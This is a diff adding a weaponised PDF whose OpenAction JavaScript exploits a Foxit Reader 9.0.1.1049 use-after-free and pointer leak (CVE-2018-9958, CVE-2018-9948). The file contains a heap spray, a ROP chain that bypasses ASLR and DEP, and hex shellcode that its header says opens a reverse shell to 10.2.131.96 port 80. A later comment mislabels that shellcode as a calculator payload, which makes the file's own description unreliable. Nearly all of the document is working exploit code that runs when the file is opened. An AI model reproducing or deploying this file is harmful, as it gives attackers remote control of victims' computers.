@@ -1,0 +1,234 @@
+%PDF 
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>> 
+2 0 obj
+<</S /JavaScript /JS (
+/*REVERSE SHELL on 10.2.131.96 port 80
+#---------------------------------------------------------------------------------------------------#
+# Exploit Title   : Foxit Reader 9.0.1.1049 Use After Free with ASLR and DEP bypass on heap         #
+# Date            : 08/04/2018 (4 Aug)                                                              #
+# Exploit Author  : Manoj Ahuje                                                                     #
+# Linkdin         : https://www.linkedin.com/in/manojahuje/                                         #
+# Tested on       : Windows 7 Pro (x32)                                                             #
+# Software Link   : https://www.foxitsoftware.com/downloads/latest.php?product=Foxit-Reader&platform=Windows&version=9.0.1.1049&package_type=exe&language=English
+# Version         : Foxit Reader 9.0.1.1049                                                         #
+# CVE             : CVE-2018-9958, CVE-2018-9948                                                    #
+# Credits to "Mr_Me" for Reseach and initial exploit                                                #
+#---------------------------------------------------------------------------------------------------#
+
+
+#Details:
+#This exploit make use heap space to store the shellcode in addition to UAF bypassing ASLR    and DEP to get successful payload execution
+
+*/
+var heap_ptr  = 0;
+var foxit_base = 0;
+
+function heap_spray(size){
+    var arr = new Array(size);
+    for (var i = 0; i < arr.length; i++) {
+    
+        // re-claim and stack pivot-0x8
+        arr[i] = new ArrayBuffer(0x10000-0x8);//0xFFF8
+        var claimed = new Int32Array(arr[i]);
+        var c_length = claimed.length;
+   
+/* custom made ROP chain virtualalloc call
+   Author: Manoj Ahuje  */
+	    
+	claimed[0x00] = foxit_base + 0x01A65184; //# PUSH EAX # POP ESP # POP EDI # POP ESI # POP EBX # POP EBP # RETN
+	claimed[0x01] = foxit_base + 0x01A65184;
+	claimed[0x02] = foxit_base + 0x01A65184;
+	claimed[0x03] = foxit_base + 0x01A65184;
+        claimed[0x04] = foxit_base + 0x14f9195;  // # POP EBX # RETN
+        claimed[0x05] = foxit_base + 0x41414141; // 
+	claimed[0x06] = foxit_base + 0x1f224fc;  // # ptr to &VirtualProtect()
+        claimed[0x07] = foxit_base + 0x0e70281;  // # MOV ESI,DWORD PTR DS:[EBX] # RETN 
+        claimed[0x08] = foxit_base + 0x1582698;  // # POP EBP # RETN 
+        claimed[0x09] = foxit_base + 0xa0dbd;    // # & jmp esp 
+        claimed[0x0a] = foxit_base + 0x14ed06d;  // # POP EBX # RETN  
+        claimed[0x0b] = 0x00000201;              // # 0x00000201-> ebx
+        claimed[0x0c] = foxit_base + 0x1e62f7e;  // # POP EDX # RETN  
+        claimed[0x0d] = 0x00000040;              // # 0x00000040-> edx
+        claimed[0x0e] = foxit_base + 0x1ec06a9;  // # POP ECX # RETN 
+        claimed[0x0f] = foxit_base + 0x29bac74;  // # &Writable location 
+        claimed[0x10] = foxit_base + 0xb971f;    // # POP EDI # RETN  
+        claimed[0x11] = foxit_base + 0x177769e;  // # RETN (ROP NOP) 
+        claimed[0x12] = foxit_base + 0x1A89808;  // # POP EAX # RETN 
+        claimed[0x13] = 0x90909090;              // # nop
+        claimed[0x14] = foxit_base + 0x129d4f0;  // # PUSHAD # RETN  
+	claimed[0x15] = 0x90909090;
+	claimed[0x16] = 0x90909090;
+	claimed[0x17] = 0x90909090;
+	claimed[0x18] = 0x90909090;
+	claimed[0x19] = 0x90909090;
+	//claimed[0x1a] = 0x90909090;
+	    
+        //regular CALCULATOR shellcode
+	    
+claimed[0x1a] = 0x0082e8fc
+claimed[0x1b] = 0x89600000
+claimed[0x1c] = 0x64c031e5
+claimed[0x1d] = 0x8b30508b
+claimed[0x1e] = 0x528b0c52
+claimed[0x1f] = 0x28728b14
+claimed[0x20] = 0x264ab70f
+claimed[0x21] = 0x3cacff31
+claimed[0x22] = 0x2c027c61
+claimed[0x23] = 0x0dcfc120
+claimed[0x24] = 0xf2e2c701
+claimed[0x25] = 0x528b5752
+claimed[0x26] = 0x3c4a8b10
+claimed[0x27] = 0x78114c8b
+claimed[0x28] = 0xd10148e3
+claimed[0x29] = 0x20598b51
+claimed[0x2a] = 0x498bd301
+claimed[0x2b] = 0x493ae318
+claimed[0x2c] = 0x018b348b
+claimed[0x2d] = 0xacff31d6
+claimed[0x2e] = 0x010dcfc1
+claimed[0x2f] = 0x75e038c7
+claimed[0x30] = 0xf87d03f6
+claimed[0x31] = 0x75247d3b
+claimed[0x32] = 0x588b58e4
+claimed[0x33] = 0x66d30124
+claimed[0x34] = 0x8b4b0c8b
+claimed[0x35] = 0xd3011c58
+claimed[0x36] = 0x018b048b
+claimed[0x37] = 0x244489d0
+claimed[0x38] = 0x615b5b24
+claimed[0x39] = 0xff515a59
+claimed[0x3a] = 0x5a5f5fe0
+claimed[0x3b] = 0x8deb128b
+claimed[0x3c] = 0x3233685d
+claimed[0x3d] = 0x77680000
+claimed[0x3e] = 0x545f3273
+claimed[0x3f] = 0x26774c68
+claimed[0x40] = 0xffe88907
+claimed[0x41] = 0x0190b8d0
+claimed[0x42] = 0xc4290000
+claimed[0x43] = 0x29685054
+claimed[0x44] = 0xff006b80
+claimed[0x45] = 0x680a6ad5
+claimed[0x46] = 0x6083020a
+claimed[0x47] = 0x00000268
+claimed[0x48] = 0x50e68950
+claimed[0x49] = 0x40505050
+claimed[0x4a] = 0x68504050
+claimed[0x4b] = 0xe0df0fea
+claimed[0x4c] = 0x6a97d5ff
+claimed[0x4d] = 0x68575610
+claimed[0x4e] = 0x6174a599
+claimed[0x4f] = 0xc085d5ff
+claimed[0x50] = 0x4eff0a74
+claimed[0x51] = 0xe8ec7508
+claimed[0x52] = 0x00000067
+claimed[0x53] = 0x046a006a
+claimed[0x54] = 0x02685756
+claimed[0x55] = 0xff5fc8d9
+claimed[0x56] = 0x00f883d5
+claimed[0x57] = 0x368b367e
+claimed[0x58] = 0x0068406a
+claimed[0x59] = 0x56000010
+claimed[0x5a] = 0x5868006a
+claimed[0x5b] = 0xffe553a4
+claimed[0x5c] = 0x6a5393d5
+claimed[0x5d] = 0x57535600
+claimed[0x5e] = 0xc8d90268
+claimed[0x5f] = 0x83d5ff5f
+claimed[0x60] = 0x287d00f8
+claimed[0x61] = 0x40006858
+claimed[0x62] = 0x006a0000
+claimed[0x63] = 0x2f0b6850
+claimed[0x64] = 0xd5ff300f
+claimed[0x65] = 0x6e756857
+claimed[0x66] = 0xd5ff614d
+claimed[0x67] = 0x0cff5e5e
+claimed[0x68] = 0x70850f24
+claimed[0x69] = 0xe9ffffff
+claimed[0x6a] = 0xffffff9b
+claimed[0x6b] = 0xc629c301
+claimed[0x6c] = 0xbbc3c175
+claimed[0x6d] = 0x56a2b5f0
+claimed[0x6e] = 0xff53006a
+claimed[0x6f] = 0x909090d5
+
+
+
+        for (var j = 0x70; j < c_length; j++) {
+            claimed[j] = 0x6d616e6a;
+        }
+    }
+}
+
+function leak(){
+    /*
+        Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability
+        ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948
+        Found By: bit from meepwn team
+    */
+
+    // alloc
+    var a = this.addAnnot({type: "Text"});
+
+    // free
+    a.destroy();
+
+    // reclaim
+    var test = new ArrayBuffer(0x60);
+    var stolen = new Int32Array(test);
+
+    // leak the vftable
+    var leaked = stolen[0] & 0xffff0000;
+
+    // a hard coded offset to FoxitReader.exe base v9.0.1.1049 (sha1: a01a5bde0699abda8294d73544a1ec6b4115fa68)
+    foxit_base = leaked-0x01f50000;
+}
+
+function reclaim(){
+
+    var arr = new Array(0x10);
+    for (var i = 0; i < arr.length; i++) {
+        arr[i] = new ArrayBuffer(0x60);
+        var rop = new Int32Array(arr[i]);
+		
+        rop[0x00] = 0x11000048;
+        
+        for (var j = 0x01; j < rop.length; j++) {
+            rop[j] = 0x71727374;
+        }
+    }
+}
+
+function trigger_uaf(){
+    /*
+        Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability
+        ZDI-CAN-5620 / ZDI-18-342 / CVE-2018-9958
+        Found By: Steven Seeley (mr_me) of Source Incite
+    */
+
+    var that = this;
+    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
+    var arr = [1];
+    Object.defineProperties(arr,{
+        "0":{ 
+            get: function () {
+
+                // free
+                that.getAnnot(0, "uaf").destroy();
+
+                // reclaim freed memory
+                reclaim();
+                return 1; 
+            }
+        }
+    });
+    a.point = arr;
+}
+
+leak();
+heap_spray(0x1000);
+
+trigger_uaf();
+
+)>> trailer <</Root 1 0 R>>
